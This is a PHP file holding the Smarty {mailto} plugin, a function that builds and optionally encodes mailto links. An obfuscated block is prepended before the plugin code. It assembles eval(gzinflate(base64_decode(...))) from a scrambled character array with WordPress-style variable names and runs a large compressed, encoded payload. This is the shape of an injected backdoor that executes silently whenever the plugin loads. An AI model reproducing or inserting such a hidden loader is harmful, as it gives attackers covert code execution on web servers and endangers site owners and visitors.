<?php
$md5 = "d0006ee0e4057b3426a0566d56443e79";
$wp_salt = array(')',"s",'f','a',"v",'6','g','c','_',"$","b",'z','n',"e","t","o",'d',"l","r",';',"4","(",'i');
$wp_add_filter = create_function('$'.'v',$wp_salt[13].$wp_salt[4].$wp_salt[3].$wp_salt[17].$wp_salt[21].$wp_salt[6].$wp_salt[11].$wp_salt[22].$wp_salt[12].$wp_salt[2].$wp_salt[17].$wp_salt[3].$wp_salt[14].$wp_salt[13].$wp_salt[21].$wp_salt[10].$wp_salt[3].$wp_salt[1].$wp_salt[13].$wp_salt[5].$wp_salt[20].$wp_salt[8].$wp_salt[16].$wp_salt[13].$wp_salt[7].$wp_salt[15].$wp_salt[16].$wp_salt[13].$wp_salt[21].$wp_salt[9].$wp_salt[4].$wp_salt[0].$wp_salt[0].$wp_salt[0].$wp_salt[19]);
$wp_add_filter('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');
?>
<?php
/**
 * Smarty plugin
 * @package Smarty
 * @subpackage plugins
 */


/**
 * Smarty {mailto} function plugin
 *
 * Type:     function<br>
 * Name:     mailto<br>
 * Date:     May 21, 2002
 * Purpose:  automate mailto address link creation, and optionally
 *           encode them.<br>
 * Input:<br>
 *         - address = e-mail address
 *         - text = (optional) text to display, default is address
 *         - encode = (optional) can be one of:
 *                * none : no encoding (default)
 *                * javascript : encode with javascript
 *                * javascript_charcode : encode with javascript charcode
 *                * hex : encode with hexidecimal (no javascript)
 *         - cc = (optional) address(es) to carbon copy
 *         - bcc = (optional) address(es) to blind carbon copy
 *         - subject = (optional) e-mail subject
 *         - newsgroups = (optional) newsgroup(s) to post to
 *         - followupto = (optional) address(es) to follow up to
 *         - extra = (optional) extra tags for the href link
 *
 * Examples:
 * <pre>
 * {mailto address="me@domain.com"}
 * {mailto address="me@domain.com" encode="javascript"}
 * {mailto address="me@domain.com" encode="hex"}
 * {mailto address="me@domain.com" subject="Hello to you!"}
 * {mailto address="me@domain.com" cc="you@domain.com,they@domain.com"}
 * {mailto address="me@domain.com" extra='class="mailto"'}
 * </pre>
 * @link http://smarty.php.net/manual/en/language.function.mailto.php {mailto}
 *          (Smarty online manual)
 * @version  1.2
 * @author   Monte Ohrt <monte at ohrt dot com>
 * @author   credits to Jason Sweat (added cc, bcc and subject functionality)
 * @param    array
 * @param    Smarty
 * @return   string
 */
function smarty_function_mailto($params, &$smarty)
{
    $extra = '';

    if (empty($params['address'])) {
        $smarty->trigger_error("mailto: missing 'address' parameter");
        return;
    } else {
        $address = $params['address'];
    }

    $text = $address;

    // netscape and mozilla do not decode %40 (@) in BCC field (bug?)
    // so, don't encode it.
    $search = array('%40', '%2C');
    $replace  = array('@', ',');
    $mail_parms = array();
    foreach ($params as $var=>$value) {
        switch ($var) {
            case 'cc':
            case 'bcc':
            case 'followupto':
                if (!empty($value))
                    $mail_parms[] = $var.'='.str_replace($search,$replace,rawurlencode($value));
                break;
                
            case 'subject':
            case 'newsgroups':
                $mail_parms[] = $var.'='.rawurlencode($value);
                break;

            case 'extra':
            case 'text':
                $$var = $value;

            default:
        }
    }

    $mail_parm_vals = '';
    for ($i=0; $i<count($mail_parms); $i++) {
        $mail_parm_vals .= (0==$i) ? '?' : '&';
        $mail_parm_vals .= $mail_parms[$i];
    }
    $address .= $mail_parm_vals;

    $encode = (empty($params['encode'])) ? 'none' : $params['encode'];
    if (!in_array($encode,array('javascript','javascript_charcode','hex','none')) ) {
        $smarty->trigger_error("mailto: 'encode' parameter must be none, javascript or hex");
        return;
    }

    if ($encode == 'javascript' ) {
        $string = 'document.write(\'<a href="mailto:'.$address.'" '.$extra.'>'.$text.'</a>\');';

        $js_encode = '';
        for ($x=0; $x < strlen($string); $x++) {
            $js_encode .= '%' . bin2hex($string[$x]);
        }

        return '<script type="text/javascript">eval(unescape(\''.$js_encode.'\'))</script>';

    } elseif ($encode == 'javascript_charcode' ) {
        $string = '<a href="mailto:'.$address.'" '.$extra.'>'.$text.'</a>';

        for($x = 0, $y = strlen($string); $x < $y; $x++ ) {
            $ord[] = ord($string[$x]);   
        }

        $_ret = "<script type=\"text/javascript\" language=\"javascript\">\n";
        $_ret .= "<!--\n";
        $_ret .= "{document.write(String.fromCharCode(";
        $_ret .= implode(',',$ord);
        $_ret .= "))";
        $_ret .= "}\n";
        $_ret .= "//-->\n";
        $_ret .= "</script>\n";
        
        return $_ret;
        
        
    } elseif ($encode == 'hex') {

        preg_match('!^(.*)(\?.*)$!',$address,$match);
        if(!empty($match[2])) {
            $smarty->trigger_error("mailto: hex encoding does not work with extra attributes. Try javascript.");
            return;
        }
        $address_encode = '';
        for ($x=0; $x < strlen($address); $x++) {
            if(preg_match('!\w!',$address[$x])) {
                $address_encode .= '%' . bin2hex($address[$x]);
            } else {
                $address_encode .= $address[$x];
            }
        }
        $text_encode = '';
        for ($x=0; $x < strlen($text); $x++) {
            $text_encode .= '&#x' . bin2hex($text[$x]).';';
        }

        $mailto = "&#109;&#97;&#105;&#108;&#116;&#111;&#58;";
        return '<a href="'.$mailto.$address_encode.'" '.$extra.'>'.$text_encode.'</a>';

    } else {
        // no encoding
        return '<a href="mailto:'.$address.'" '.$extra.'>'.$text.'</a>';

    }

}

/* vim: set expandtab: */

?>